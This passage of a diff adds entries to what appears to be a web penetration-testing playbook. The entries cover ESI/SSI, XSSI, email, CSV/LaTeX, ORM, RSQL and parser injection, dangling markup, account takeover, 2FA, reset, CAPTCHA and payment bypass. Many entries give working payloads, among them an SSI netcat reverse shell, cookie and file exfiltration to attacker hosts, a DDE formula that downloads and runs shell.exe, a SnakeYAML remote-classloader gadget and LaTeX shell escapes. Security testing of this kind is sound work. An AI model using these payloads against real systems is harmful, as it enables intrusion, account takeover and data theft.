+    "Detect ESI via `Surrogate-Control: content=\"ESI/1.0\"` header, or blind-detect with `<esi:include src=http://attacker/>`",
+    "Inject `<esi:include src=http://attacker/$(HTTP_COOKIE)>` to steal cookies",
+    "Try `<esi:include src=\"secret.txt\">` and `<esi:debug/>` for local file / debug info"
+   ],
+   "techniques": [
+    "SSI RCE: `<!--#exec cmd=\"mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo\" -->`; file read via `<!--#include file=\"...\" -->`",
+    "ESI XSS: `<esi:include src=http://attacker/xss.html>`; WAF bypass `<scr<!--esi-->ipt>alert(1)</sc<!--esi-->ript>`",
+    "Cookie steal bypassing HttpOnly: `<esi:include src=http://attacker/$(HTTP_COOKIE)>` or reflect `<!--esi $(HTTP_COOKIE) -->`",
+    "Header manipulation: `<!--esi $add_header('Content-Type','text/html') -->` or CRLF in request_header (CVE-2019-2438)",
+    "ESI+XSLT=XXE: `<esi:include src=\"http://host/poc.xml\" dca=\"xslt\" stylesheet=\"http://host/poc.xsl\"/>`"
+   ],
+   "verify": "Positive marker: submit `<!--#echo var=\"DOCUMENT_NAME\" -->` and see the actual document name echoed (SSI), or `<esi:include src=http://attacker/canary>` and observe a request hit your server. Negative control: send the same directive with a malformed/never-registered directive (e.g. `<!--#echo var=\"RANDOM_UNIQUE_XYZ\" -->`) — if it renders nothing/errors while the valid one renders, the evaluation is genuine rather than a reflection artifact."
+  },
+  {
+   "id": "xssi_cross_site_script_inclusion",
+   "name": "XSSI (Cross-Site Script Inclusion)",
+   "summary": "Leveraging the fact that `<script>` tags can load cross-origin JavaScript despite the Same-Origin Policy, to steal authenticated/private data embedded in executable script or JSONP responses. The victim's cookies ride along with the request, and the attacker reads the data through callbacks or global variable side effects.",
+   "objectives": [
+    "Locate script/JSONP endpoints that embed private, cookie-authenticated data",
+    "Leak data via global variables, JSONP callback hijacking, or prototype tampering",
+    "Detect dynamic per-user content by comparing with/without-cookie responses"
+   ],
+   "how_to_test": [
+    "Find endpoints serving JS/JSONP that differ with vs without cookies (use DetectDynamicJS or manual diff)",
+    "Include the script in a page and read globals: `<script src=\"//target/script.js\"></script><script>alert(JSON.stringify(secret[0]))</script>`",
+    "Hijack JSONP: define `angular.callbacks._7 = function(d){...}` then request `?jsonp=angular.callbacks._7`",
+    "For non-global variables, override `Array.prototype.slice` or similar to intercept internal reads",
+    "Test non-script XSSI: include a CSV/JSON file as a script with `charset=\"UTF-7\"` where applicable"
+   ],
+   "techniques": [
+    "Regular XSSI: `<script src=\"https://target/script.js\"></script>` then read leaked global `confidential_keys[0]`",
+    "JSONP hijack: define `leak = function(d){ alert(JSON.stringify(d)) }` then `<script src=\"//site/p?jsonp=leak\">`",
+    "Prototype tampering: `Array.prototype.slice = function(){ sendToAttacker(this) }` to catch non-global arrays",
+    "Angular callback override: `angular.callbacks._7 = function(leaked){...}` matching the requested callback name",
+    "UTF-7 JSON XSSI: include JSON with UTF-7-encoded payload via `<script charset=\"UTF-7\" src=\"//site/json-utf7.json\">`"
+   ],
+   "verify": "Positive marker: on a victim session, include the script and observe the attacker server receive a canary value that only exists in the authenticated response (e.g. a leaked email/token). Negative control: repeat from an unauthenticated/incognito session — the same value must NOT be received, proving the leaked data is tied to the victim's credentials and not a static resource."
+  },
+  {
+   "id": "email_injection",
+   "name": "Email (Header) Injection",
+   "summary": "Injection of CRLF or crafted addresses into email fields to add Cc/Bcc/To/Subject headers, rewrite the message body, or abuse MTA command-line parameters for file read and RCE. Also covers splitting/encoding tricks in the local-part that bypass domain allow-lists and redirect verification mail.",
+   "objectives": [
+    "Inject extra headers (Cc/Bcc/To/Subject) and rewrite the body via %0a",
+    "Abuse the PHP mail() 5th parameter to pass sendmail flags for RCE/file leak",
+    "Bypass email allow-lists using encoding, quotes, comments, and IP literals"
+   ],
+   "how_to_test": [
+    "Test a field reflected into email by appending `%0ACc:attacker@domain.com` and `%0ABcc:...`",
+    "Inject `%0A%0A<body>` to rewrite the message body",
+    "If PHP `mail()` 5th param is controllable, try `-X/tmp/out` (log SMTP traffic) or MTA-specific flags",
+    "Fuzz the local-part with `+tag`, `(comment)`, quoted strings, and encodings to see what the server normalizes",
+    "Attempt `RCPT TO:` splitting via encoded `@` (`=40`) and `>` (`=3e`) to redirect verification emails"
+   ],
+   "techniques": [
+    "`From:sender@domain.com%0ACc:r@d.co,%0ABcc:r1@d.com` adds recipients; `%0ASubject:Fake` alters subject",
+    "PHP mail() RCE: abuse `$additional_parameters` with `-X/tmp/x` to dump raw SMTP, or `-O` / MTA-specific flags to read files / run commands",
+    "Encoded splitting: `=?x?q?collab=40psres.net=3e=00?=foo@example.com` -> sends to `collab@psres.net` (Github/Gitlab/Zendesk variants)",
+    "Ignored-part tricks: `john.doe+tag@`, `john.doe(comment)@`, `john.doe@[127.0.0.1]` to defeat filters",
+    "Punycode: `x@xn--svg/-9x6` -> `x@<svg/` for XSS/tag injection; Reply-To spoofing to capture auto-replies"
+   ],
+   "verify": "Positive marker: inject `%0ACc:<unique-address>@<attacker-controlled-inbox>` and confirm the email actually arrives at the injected address (not just echoed). Negative control: submit the same value with CRLF encoded (`%250A`) — no additional recipient should be created, confirming the header split is caused by your raw newline and not by the application's own handling."
+  },
+  {
+   "id": "formula_csv_injection",
+   "name": "Formula / CSV / LaTeX Injection",
+   "summary": "Injection of spreadsheet formulas, DDE commands, or LaTeX constructs into exported documents (CSV/XLSX, PDF generation) so that opening the file executes commands or exfiltrates data from the victim's machine. Impact ranges from data exfiltration on open/click to local file read and RCE via DDE, LaTeX shell-escape, or LibreOffice/Google Sheets functions.",
+   "objectives": [
+    "Plant executable formulas/DDE in fields that are exported to CSV/XLSX",
+    "Achieve RCE on the opener via DDE/command payloads or LaTeX \\write18",
+    "Exfiltrate local files via LibreOffice/Google Sheets functions or LaTeX file reads"
+   ],
+   "how_to_test": [
+    "Find fields exported to CSV/Excel; inject `=cmd|' /C calc'!A0` or `=HYPERLINK(\"http://attacker\",\"click\")`",
+    "Confirm the value starts with `=`, `+`, `-`, `@` and is not prefixed with a quote/space by the exporter",
+    "Test DDE payloads (requires DDE Server Launch enabled + user accepts warnings)",
+    "If LaTeX/PDF generation exists, try `\\input{/etc/passwd}` and `\\immediate\\write18{...}`",
+    "Test LibreOffice/Google Sheets exfil: `=WEBSERVICE(...)` and `='file:///etc/passwd'#$passwd.A1`"
+   ],
+   "techniques": [
+    "DDE RCE: `=cmd|' /C calc'!xxx` or `=cmd|'/C powershell IEX(wget attacker/shell.exe)'!A0`",
+    "Hyperlink exfil: `=HYPERLINK(\"http://attacker/log?x=\"&A2,\"click\")`",
+    "LibreOffice LFI: `='file:///etc/passwd'#$passwd.A1` and exfil via `=WEBSERVICE(CONCATENATE(\"http://attacker/\",('file:///etc/passwd'#$passwd.A1)))`",
+    "Google Sheets OOB: `=IMPORTXML(CONCAT(\"http://attacker/?v=\",CONCATENATE(A2:E2)),\"//a\")`, `=IMPORTFEED(...)`, `=IMAGE(...)`",
+    "LaTeX: `\\input{/etc/passwd}`, `\\include{password}`, `\\lstinputlisting{...}` for read; `\\immediate\\write18{env > out}` + `\\input{out}` for RCE"
+   ],
+   "verify": "Positive marker: export a record containing `=HYPERLINK(\"http://attacker/canary\",\"x\")` (or a WEBSERVICE formula) and confirm the attacker server receives a request when the file is opened. Negative control: export the same value with a leading `'` or space (e.g. `'=HYPERLINK(...)`) — no request should fire, proving the exporter does not neutralize formulas and that execution is genuinely formula-driven."
+  },
+  {
+   "id": "orm_injection",
+   "name": "ORM / Query-Builder Injection",
+   "summary": "Abuse of Object-Relational Mapping layers (Django, Prisma, Beego, Ransack, Entity Framework/OData, Strapi) when attacker-controlled keys, operators, or filters are passed unsafely into ORM queries. Enables secret leakage, relational pivoting past access controls, and boolean/timing oracles without classic SQL injection.",
+   "objectives": [
+    "Leak fields (passwords, tokens, salts) through relation traversal and operator injection",
+    "Bypass field/record filters by looping back through many-to-many relations",
+    "Build boolean or timing oracles to brute-force secrets character by character"
+   ],
+   "how_to_test": [
+    "Find endpoints passing raw request JSON/query to ORM filters, e.g. `Article.objects.filter(**request.data)` or `prisma.article.findMany({where: req.query})`",
+    "Probe Django-style lookups: `{\"username\":\"admin\",\"password__startswith\":\"a\"}` or `created_by__user__password__contains=...`",
+    "For Prisma, test type-confused operators: `{\"resetToken\":{\"not\":\"E\"}}` or `resetToken[contains]=argon2`",
+    "Enumerate relations and many-to-many loopbacks to reach unrelated users' secrets",
+    "Detect oracles via response length, pagination `total`, row presence, or ReDoS/timing (`__regex`)"
+   ],
+   "techniques": [
+    "Django: `{\"created_by__user__password__contains\":\"pass\"}` and group/permission pivots `created_by__user__groups__user__password`",
+    "Prisma: `{select:{createdBy:{select:{password:true}}}}` or `{categories:{some:{articles:{some:{published:false,...}}}}}` loopback bypass",
+    "Prisma operator injection: `{\"resetToken\":{\"not\":\"E\"},\"password\":\"newpass\"}` to reset without knowing the token",
+    "Beego/Harbor overwrite: `email__password__startswith=foo` passes the `Filterable(email)` check but executes `password__startswith`",
+    "Strapi where-smuggling: `GET /api/articles?where[updatedBy][resetPasswordToken][$startsWith]=d` with `meta.pagination.total` as the boolean oracle",
+    "Ransack/OData: `q[user_reset_password_token_start]=0` and `$filter=CreatedBy/TfaSecret ge 'M'` binary-search oracles"
+   ],
+   "verify": "Positive marker: send a predicate that should flip row count, e.g. `where[id][$lt]=-1` (or a `password__startswith` on a known prefix), and observe the result set / `total` change from baseline. Negative control: repeat with an always-false predicate on a field that should never match and confirm `total==0` while a deliberately invalid operator/field returns a parse error — distinguishing a live query from a canned response."
+  },
+  {
+   "id": "rsql_injection",
+   "name": "RSQL / FIQL Filter Injection",
+   "summary": "Injection into RSQL/FIQL filter expressions used by REST/JSON:API backends (Elide, JPA Specification) to build read filters. Leads to unauthorized data access, user enumeration, authorization bypass, privilege escalation, and IDOR/impersonation via nested relation traversal and boolean oracles.",
+   "objectives": [
+    "Enumerate users and sensitive fields through filter oracles",
+    "Bypass authorization and escalate to admin by substituting identifiers",
+    "Traverse relations and abuse framework-specific translators for deeper leaks"
+   ],
+   "how_to_test": [
+    "Send harmless probes `?filter=id==test` or `?q==test`; look for parser errors ('Unknown operator/property') as a fingerprint",
+    "Enumerate via `filter[userAccounts]=email=='victim@x.com'` and observe whether user data returns",
+    "Test boolean oracles: `filter[users]=id=in=(*a*)` then compare response sizes",
+    "Try relation traversal and custom operators: `=like=`, `=ilike=`, `=ini=`, `=rng=`, `=isnull=`",
+    "Enumerate admin IDs then reuse them: `filter[companyUsers]=user.id=='<admin-id>'` on privilege-checked endpoints"
+   ],
+   "techniques": [
+    "Info leak: `GET /api/registrations?filter[userAccounts]=email=='victim@x.com'` returns full user DTO on match",
+    "Authz evasion: `GET /api/users?filter[users]=id=in=(*a*)` returns users despite a 403 on `/api/users`",
+    "Privilege escalation: enumerate `user.id` of an admin, then `filter[companyUsers]=user.id=='<id>'` to assume their permissions",
+    "Relationship/global filters (Elide): `filter=authors.name=='Null Ned';title=='Life with Null Ned'` and `data.user.id==1` for jsonb traversal",
+    "Wildcard exfil: `filter[users]=email==*%@example.com;status==ACTIVE`, flip with `,` (OR) and double-encode `%2528admin%2529` to dodge WAFs"
+   ],
+   "verify": "Positive marker: request `filter[users]=id=='<your-own-id>'` and confirm your own record is returned; then swap to another known ID and observe a different record (IDOR) or a `total` change. Negative control: send `filter[users]=id==<impossible-value>` and confirm zero results, and a malformed operator `=foo=` that yields a distinct parse error — proving the filter is actually evaluated against the store."
+  },
+  {
+   "id": "json_xml_yaml_hacking",
+   "name": "JSON / XML / YAML Parser Differential & Deserialization",
+   "summary": "Exploitation of permissive parsers and cross-service parser disagreement (duplicate keys, case-insensitive matching, Unicode fold collisions, polyglot payloads) to bypass authorization, plus unsafe deserialization leading to RCE. The danger lies in trust decisions made by parsers with different interpretations of the same bytes.",
+   "objectives": [
+    "Exploit duplicate-key and case-collision differences between parsers to bypass authz",
+    "Abuse mass-assignment and unsafe YAML/XML deserialization for RCE",
+    "Fingerprint parser behavior (Go v1 vs v2, SnakeYAML, libyaml) at each trust boundary"
+   ],
+   "how_to_test": [
+    "Send duplicate JSON keys `{\"action\":\"UserAction\",\"action\":\"AdminAction\"}` and observe which wins downstream",
+    "Test case-variants and Unicode fold: `{\"AcTiOn\":\"AdminAction\"}`, `{\"Uſername\":\"admin\"}`, `{\"Key\":\"value\"}`",
+    "Craft polyglots mixing JSON/XML/YAML so different parsers extract different actions",
+    "Try unsafe YAML deserialization gadgets: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil/\"]]]]`",
+    "Probe for mass-assignment: set fields the app never intended (`\"IsAdmin\":true`) or misused `json:\"-\"` tags"
+   ],
+   "techniques": [
+    "Duplicate-key last-wins (Go v1): `{\"action\":\"UserAction\",\"action\":\"AdminAction\"}` -> `AdminAction` while a Python proxy authorizes `UserAction`",
+    "Unicode fold matching: long-s `Uſername` matches `Username`, Kelvin sign `Key` matches `Key`",
+    "Polyglot confusion (CVE-2020-16250): JSON with embedded XML `\"ignored\":\"<?xml ...><Action>Action_3</Action>\"` parsed differently by JSON/XML/YAML",
+    "SnakeYAML RCE (CVE-2022-1471): global-tag `!!javax.script.ScriptEngineManager` gadget with remote URL classloader",
+    "Misconfigured tags: `json:\"-,omitempty\"` leaves `IsAdmin` settable via `{\"-\":true}`; libyaml double-free (CVE-2024-35325) for DoS"
+   ],
+   "verify": "Positive marker: send `{\"role\":\"user\",\"role\":\"admin\"}` and confirm the backend acts with admin privileges (duplicate accepted, last wins). Negative control: send `{\"role\":\"admin\"}` alone (single key) — if the same privilege results, the app doesn't actually distinguish; a real differential shows user-level behavior for the single key and admin behavior only with the crafted duplicate."
+  },
+  {
+   "id": "unicode_injection",
+   "name": "Unicode Normalization / Best-Fit Injection",
+   "summary": "Bypassing input filters by using Unicode lookalike characters that are normalized, case-folded, or converted to ASCII metacharacters after validation. Notably, SQL Server Best-Fit and Windows code-page conversions silently turn fullwidth/Unicode glyphs into `<`, `>`, `'`, `/`, `\\`, `.` enabling stored XSS, SQLi, and path traversal.",
+   "objectives": [
+    "Bypass filters via characters that normalize to dangerous ASCII post-validation",
+    "Exploit SQL Server Best-Fit conversion to smuggle XSS/SQLi/path-traversal payloads",
+    "Leverage multi-step encoding conversions (Windows-1252 -> UTF-8 -> ASCII) to form payloads"
+   ],
+   "how_to_test": [
+    "Submit fullwidth/compatibility lookalikes for `< > ' \" / \\ . - ?` and observe post-storage normalization",
+    "Check DB columns for `varchar`/`char`/`text` with non-UTF collations (CP1252) doing implicit `nvarchar -> varchar` conversion",
+    "Test `＜` (U+FF1C) into a narrow column and read back whether it became `<`",
+    "Probe case-insensitive collations: `SELECT IIF('abc'='ABC',1,0)` to detect `*_CI_*` logic bugs",
+    "Try `\\u`-to-`%` transforms (e.g. `\\u3c4b` -> `%3c4b` -> `<4b`) and emoji/multi-encoding XSS payloads"
+   ],
+   "techniques": [
+    "Best-Fit stored XSS: insert `N'〈script〉alert(ʹxʹ)〈/script〉'` into VARCHAR, read back `<script>alert('x')</script>`",
+    "Path traversal after storage: `N'．．∖．．∖．．∖Windows∖win.ini'` -> `..\\..\\..\\Windows\\win.ini`",
+    "`?` reconstruction: `N'<ʭphp'` -> `<?php` when no Best-Fit mapping exists",
+    "Emoji double-conversion XSS: `＜img src=x onerror=...` passed through Windows-1252->UTF-8->ASCII//TRANSLIT yields `<img ...>`",
+    "`\\u`-prefix mutation: `\\u3c4b` (U+3C4B) transformed to `%3c4b` -> URL-decoded `<4b`"
+   ],
+   "verify": "Positive marker: store `N'＜'` in a VARCHAR column and confirm the read-back value is the ASCII `<` (or that a fullwidth payload renders as executable HTML). Negative control: insert the same value into an NVARCHAR column (or with `N'...'` preserved) and confirm it remains `＜` unchanged — proving the mutation is caused by the narrow-column conversion rather than the input itself."
+  },
+  {
+   "id": "dangling_markup_injection",
+   "name": "Dangling Markup / Scriptless HTML Injection",
+   "summary": "Exfiltration of data from a page using injected HTML that is left 'dangling' (unclosed attribute/quote) so the browser appends subsequent page content — including secrets — into a URL sent to the attacker. Used when HTML injection exists but JavaScript/XSS is blocked (often by CSP), and to disrupt form/script workflows.",
+   "objectives": [
+    "Exfiltrate clear-text secrets appearing later in the page via dangling attributes",
+    "Steal form submissions by hijacking action/base/formaction targets",
+    "Disrupt legitimate script/namespace flows to alter application behavior"
+   ],
+   "how_to_test": [
+    "Find an HTML-injection point and inject `<img src='http://attacker/log?` (test single and double quotes)",
+    "Confirm the browser appends the following HTML until the next matching quote into the request URL",
+    "Try `<base href=\"http://attacker/\">` and observe form targets change to the attacker domain",
+    "Test `<meta http-equiv=\"refresh\" content=\"0;url=http://attacker/?text=` and CSS `@import//attacker?`",
+    "Explore scriptless workflow disruption: namespace/`getElementById` overwrites, JSONP call injection, iframe/name leaks"
+   ],
+   "techniques": [
+    "Secret theft: `<img src='http://attacker/log.php?HTML=` or `<meta http-equiv=\"refresh\" content='0;URL=ftp://attacker/?a=` (ftp bypasses Chrome's `<`/`\\n` block)",
+    "Form theft: `<base href=\"http://attacker/\">` or `<form action='http://attacker/log_steal'>` or `<button formaction=\"https://attacker\">`",
+    "CSS exfil: `<style>@import//attacker?` then `<b>steal me!</b>;` sends content until `;`",
+    "noscript exfil: `<noscript><form action=http://attacker><textarea name=contents>` full-page steal with JS off",
+    "Namespace attack: inject `<input type=\"hidden\" id=\"share_with\" value=\"attacker\">` before the real one; iframe `name` leak for CSP-bypass via `window.name`"
+   ],
+   "verify": "Positive marker: inject `<img src='http://attacker/canary?` immediately before a known secret and confirm the attacker receives a request whose query string contains that secret. Negative control: inject a self-closing tag `<img src='http://attacker/canary?x'>` (attribute closed immediately) — the request should contain only `x` and NOT the following content, proving the capture is caused by the dangling quote rather than a full page send."
+  },
+  {
+   "id": "account_takeover",
+   "name": "Account Takeover",
+   "summary": "Playbook of techniques to hijack a user's account by abusing weak identity flows: skippable email confirmation, Unicode normalization collisions, reusable magic links, predictable SSO tickets, and pre-account registration races.",
+   "objectives": [
+    "Map every path that can move account ownership (email change, reset, SSO, QR/cross-device login).",
+    "Find confirmation/normalization gaps that let an attacker's identifier alias a victim's mailbox.",
+    "Weaponize the weakest flow into full unauthorized access."
+   ],
+   "how_to_test": [
+    "Attempt to change the account email and probe whether the confirmation step can be skipped or self-confirmed.",
+    "Register a Unicode confusable of the victim email (e.g. vićtim@gmail.com) and check whether normalization maps it onto the victim account.",
+    "Request a magic link/reset for the victim and test open-redirect parameters (redirect_url, next, return_to) and whether the token lands in a browser-readable place.",
+    "Reuse an already-consumed reset/magic link from a second browser/device, and check the flow after an email change.",
+    "Replay candidate predictable SSO bearer tickets with a mismatched app tag and confirm via protected-request 200 vs login 302."
+   ],
+   "techniques": [
+    "Unicode/email normalization collisions (confusables in local-part or domain) to alias the victim mailbox.",
+    "Pre-account takeover: sign up with the victim's email, set a password, and hope the victim later confirms via OAuth.",
+    "Security-question reset that trusts a client-supplied username to overwrite another user's recovery answers (IDOR).",
+    "Trusted-device cookie exfiltration via batch-API JSON-path references, then replaying the device cookie.",
+    "Change-email/session swap: send the email-change confirmation link to the victim so their authenticated session confirms the attacker's address."
+   ],
+   "verify": "Set a unique collaborator marker as the target email (victim+<marker>@...) and a negative-control address that should not alias it; confirm takeover only when the marker address maps into the victim's account while the control stays separate."
+  },
+  {
+   "id": "two_fa_bypass",
+   "name": "2FA / MFA / OTP Bypass",
+   "summary": "Catalog of ways to defeat two-factor/OTP authentication by exploiting missing server-side enforcement, token reuse, weak generation, race conditions, and alternate or legacy authentication paths.",
+   "objectives": [
+    "Determine whether MFA completion is actually enforced server-side rather than only in the UI.",
+    "Find tokens or flows that skip, reuse, or leak the second factor.",
+    "Brute-force or transplant OTPs when generation or binding is weak."
+   ],
+   "how_to_test": [
+    "Access post-login endpoints directly (and via a correctly spelled Referer) to check whether MFA can be skipped.",
+    "Reuse a previously consumed OTP, or use your own unused OTP on another test account to check account/session binding.",
+    "Trigger a password reset and verify whether logging in with new credentials afterward bypasses 2FA.",
+    "Race the same OTP concurrently across two sessions to test single-use atomicity.",
+    "Check older API versions (/v1/) or subdomains for endpoints that lack the current MFA requirement."
+   ],
+   "techniques": [
+    "Direct endpoint/Referer access and OTP token reuse.",
+    "Session manipulation: complete MFA in one session and transplant the state into another.",
+    "Brute-force with rate-limit resets (code resend, client-side-only throttling, session rotation).",
+    "Predictable 'remember me' cookie values or IP impersonation via X-Forwarded-For.",
+    "OTP construction errors derived from predictable or client-supplied data."
+   ],
+   "verify": "Enroll a test account with a known OTP and add a unique marker to the OTP response; confirm the bypass only when the marker request succeeds while a negative-control request using an already-consumed/wrong token is still rejected."
+  },
+  {
+   "id": "rate_limit_bypass",
+   "name": "Rate Limit Bypass",
+   "summary": "Techniques to bypass per-request or per-IP throttling by keying the limiter on client-controlled values, exploiting transport quirks (HTTP/2, GraphQL, WebSocket), or routing through alternate endpoints.",
+   "objectives": [
+    "Identify which signal (IP, path, session, header) the limiter actually keys on.",
+    "Prove the protected operation can be repeated beyond the intended quota.",
+    "Distribute or confuse the limiter without triggering account lockout."
+   ],
+   "how_to_test": [
+    "Vary endpoint casing/paths (/Sign-up vs /api/v1/sign-up) and parameters to find distinct quotas.",
+    "Append blank/control characters (%00, %0a, %09, %20) to parameters and observe whether the limiter key changes.",
+    "Rotate spoofable IP headers (X-Forwarded-For, X-Originating-IP, X-Client-IP) and test whether the source IP is trusted from an untrusted client.",
+    "Reuse one HTTP/2 connection (h2load) or GraphQL aliases to pack many attempts into few requests.",
+    "Log in / rotate sessions between attempts to detect per-session counters."
+   ],
+   "techniques": [
+    "Endpoint/path canonicalization and parameter/blank-character variation.",
+    "IP spoofing via forwarded headers and proxy/PoP rotation.",
+    "HTTP/2 multiplexing, WebSocket/gRPC streaming, and GraphQL alias batching.",
+    "Fixed-window/sliding-window boundary bursting.",
+    "Rotating account/session/User-Agent to reset quotas."
+   ],
+   "verify": "Send a unique marker in a burst exceeding the documented quota on the protected path, plus a negative control against a known-limited path; confirm the marker requests all reach the application (server-side) while the control is throttled."
+  },
+  {
+   "id": "password_reset_bypass",
+   "name": "Password Reset Bypass",
+   "summary": "Techniques to break the password-reset flow through token leakage, Host-header poisoning, email-parameter smuggling, weak token generation, and missing state checks, allowing an account to be reset without owning its mailbox.",
+   "objectives": [
+    "Capture or predict the reset token without access to the victim's mailbox.",
+    "Redirect reset links or tokens to attacker-controlled infrastructure.",
+    "Reset arbitrary accounts via weak token binding or missing flow-state checks."
+   ],
+   "how_to_test": [
+    "Request a reset, click the link, then browse to a third-party site and inspect the Referer header for the token.",
+    "Poison Host / X-Forwarded-Host / baseurl / redirect parameters and check whether the emailed link points to the attacker host.",
+    "Inject a second email parameter (duplicate, JSON array, cc/bcc via %0a%0d, commas/pipes) to copy the reset mail to the attacker.",
+    "Request several reset links in parallel and compare tokens for predictability, reuse, or non-expiry.",
+    "Reuse an expired token, submit null/empty tokens, and test cross-account use (your valid token plus the victim's email/userId)."
+   ],
+   "techniques": [
+    "Referer token leak and Host-header reset poisoning.",
+    "Email parameter pollution / multi-recipient smuggling (cc, bcc, arrays, separators).",
+    "Weak token generation (timestamp, userid, sequential) and UUIDv1 sandwich brute-force.",
+    "Missing 'token was generated' check (null/empty token accepted).",
+    "Registration-as-reset upsert and skipOldPwdCheck pre-auth password change."
+   ],
+   "verify": "Use a unique collaborator value as the reset token and a negative-control token that is wrong/expired; confirm the reset succeeds only with the marker token and is rejected with the control."
+  },
+  {
+   "id": "captcha_bypass",
+   "name": "CAPTCHA Bypass",
+   "summary": "Methods to defeat CAPTCHA controls by testing whether the server actually binds the solution to the action, reusing solved values, or automating recognition and identity rotation.",
+   "objectives": [
+    "Establish whether the server actually validates and binds the CAPTCHA to the action/session.",
+    "Reuse or extract previously solved CAPTCHA values.",
+    "Automate solving or rotate identity to sidestep the control."
+   ],
+   "how_to_test": [
+    "Omit the captcha parameter, send it empty, or switch POST/GET and data format to see if validation is skipped.",
+    "Search page source and cookies for the CAPTCHA answer, and replay old solved values across sessions.",
+    "Hash/compare challenge images to check whether the image pool is small (MD5-dedupe).",
+    "Run OCR (Tesseract) on character challenges or speech-to-text on audio fallbacks.",
+    "Rotate session/IP/User-Agent to test whether limits are bound only to those signals."
+   ],
+   "techniques": [
+    "Parameter omission/empty/method-format manipulation.",
+    "Value reuse across sessions and extraction from source/cookies.",
+    "OCR/audio recognition and third-party solver APIs.",
+    "Session/IP/header rotation and rate-limit reset."
+   ],
+   "verify": "Submit a request carrying a unique marker in an unrelated field while omitting the CAPTCHA answer, plus a negative control with a wrong CAPTCHA value; confirm the marker request succeeds (bypass) while the wrong-value control is rejected."
+  },
+  {
+   "id": "registration_vulnerabilities",
+   "name": "Registration & Takeover Vulnerabilities",
+   "summary": "Attack surface of the sign-up flow: duplicate/alias registration, username enumeration, weak OTP verification, and pre-hijacking techniques staged before the victim creates their account.",
+   "objectives": [
+    "Create accounts that alias or collide with a victim's identity.",
+    "Enumerate valid identifiers and bypass weak email/phone verification.",
+    "Stage pre-hijack state (linked identifiers, live sessions) that fires after the victim registers."
+   ],
+   "how_to_test": [
+    "Register with an existing username and email variants (case, dots, +tag, %00/%20, Unicode confusables) to defeat uniqueness checks.",
+    "Submit duplicate/array/mixed OTP parameters (code=000000&code=123456, JSON arrays) to test multi-value verification.",
+    "Brute-force short OTPs with ffuf/Turbo Intruder while rotating headers and IP.",
+    "Race a single OTP across two sessions to produce two verified accounts.",
+    "Stage a pre-hijack (register the victim email, link an attacker IdP/phone, keep a live session) then have the victim sign up."
+   ],
+   "techniques": [
+    "Duplicate/alias registration via email canonicalization tricks (dots, subaddressing, homoglyphs).",
+    "Username/account enumeration oracles (timing, status codes, contact-sync presence).",
+    "Multi-value OTP smuggling and weak-OTP brute-force.",
+    "Pre-hijacking variants (classic-federated merge, trojan identifier, unexpired session, pending email change).",
+    "Upsert-based registration-as-reset overwriting an existing account's password."
+   ],
+   "verify": "Register with a unique marker in the email local-part and a negative-control address; confirm the alias/collision maps the marker account onto the victim identity while the control stays separate."
+  },
+  {
+   "id": "payment_bypass",
+   "name": "Payment Process Bypass",
+   "summary": "Business-logic techniques to manipulate the payment flow by tampering with client-controlled values or abusing stale pricing/checkout state so an order is fulfilled for less (or nothing).",
+   "objectives": [
+    "Map the full transaction state machine (cart → checkout → provider → webhook → fulfillment).",
+    "Determine which amount/status fields are trusted from the client versus the server.",
+    "Force the server to compute an attacker-favorable total or mark an order paid."
+   ],
+   "how_to_test": [
+    "Intercept and alter Success/Referrer/Callback plus amount/currency/quantity/product/discount/shipping fields.",
+    "Create valid pricing state (quote/discount), mutate the cart, and re-checkout without editing any explicit price field.",
+    "Copy the payment URL and open it in a second profile to test whether possession alone authorizes access.",
+    "Remove parameters to probe default/fallback behavior, and tamper cookies that hold payment state.",
+    "Replay, reorder, duplicate, and omit callbacks/webhooks to test idempotency and state transitions."
+   ],
+   "techniques": [
+    "Client parameter tampering (amount, currency, quantity, status flags).",
+    "Stale pricing/checkout state-machine abuse.",
+    "Cookie/URL/session token tampering and response manipulation.",
+    "Webhook/callback replay, reorder, and omission."
+   ],
+   "verify": "Place an order with a unique marker in a non-price field, mutate only the price/status to an attacker-favorable value, plus a negative-control order with the price unchanged; confirm the marker order fulfills at the reduced total while the control is billed correctly."
+  },
+  {
+   "id": "timing_attacks",
+   "name": "Web Timing Attacks",
+   "summary": "Technique for discovering hidden functionality and server-side injection/proxy oracles by measuring consistent response-time differences between nearly identical requests, made practical with request synchronization.",
+   "objectives": [
+    "Remove transport noise to isolate tiny server-side timing deltas.",
+    "Discover hidden parameters, headers, and routes via timing oracles.",
+    "Detect blind injection or reverse-proxy/SSRF behavior when output is redacted."
+   ],
+   "how_to_test": [
+    "Build two requests differing in exactly one hypothesis and send them over the same connection at the same release point.",
+    "Alternate request order and repeat to compare paired/median deltas rather than single measurements.",
+    "Tune one branch to force extra work (DNS lookup, cache miss, parsing, logging, backend fetch).",
+    "Use Param Miner / Turbo Intruder timing templates for hidden-parameter discovery.",
+    "Compare allowed vs disallowed hostnames to reveal scoped SSRF/open-proxy behavior."
+   ],
+   "techniques": [
+    "Single-packet / last-byte synchronization to strip transport jitter.",
+    "Paired-request deltas with order alternation and median comparison.",
+    "Hidden attack-surface discovery (~5ms deltas from hidden inputs).",
+    "Blind JSON/parameter-pollution oracles and reverse-proxy misconfiguration detection."
+   ],
+   "verify": "Send a probe with a unique marker header that triggers a known slow path, plus a negative-control probe identical but without the trigger; confirm a consistent time delta only for the marker request across many repetitions."
+  },
+  {
+   "id": "uuid_insecurities",
+   "name": "UUID Insecurities",
+   "summary": "Exploiting predictable UUID versions (especially v1 time-based) to enumerate identifiers that are misused as security tokens in reset or session flows.",
+   "objectives": [
+    "Identify the UUID version/variant and whether it is time- or MAC-based.",
+    "Capture two UUIDs bracketing a victim's token to narrow the search space.",
+    "Brute-force the victim's UUID when no rate limit or lockout blocks it."
+   ],
+   "how_to_test": [
+    "Inspect the token's version digit (M position) to detect v1/v4.",
+    "Trigger resets for two controlled accounts around the victim's reset and record their UUIDs.",
+    "Generate candidates between the bracketing UUIDs and probe the reset endpoint.",
+    "Use Burp UUID Detector to flag UUIDs and the 'sandwich' tool to generate candidates.",
+    "Confirm the application lacks rate limiting/lockout on the UUID-checking endpoint."
+   ],
+   "techniques": [
+    "UUID version/variant fingerprinting (M and N bit positions).",
+    "Sandwich attack: bracket the victim UUID between two attacker-controlled values.",
+    "Time/MAC-based candidate generation and brute-force."
+   ],
+   "verify": "Use a marker value as the victim's reset UUID and a negative-control UUID far outside the timestamp range; confirm the marker UUID is accepted (candidate generation hits it) while the control is rejected."
+  },
+  {
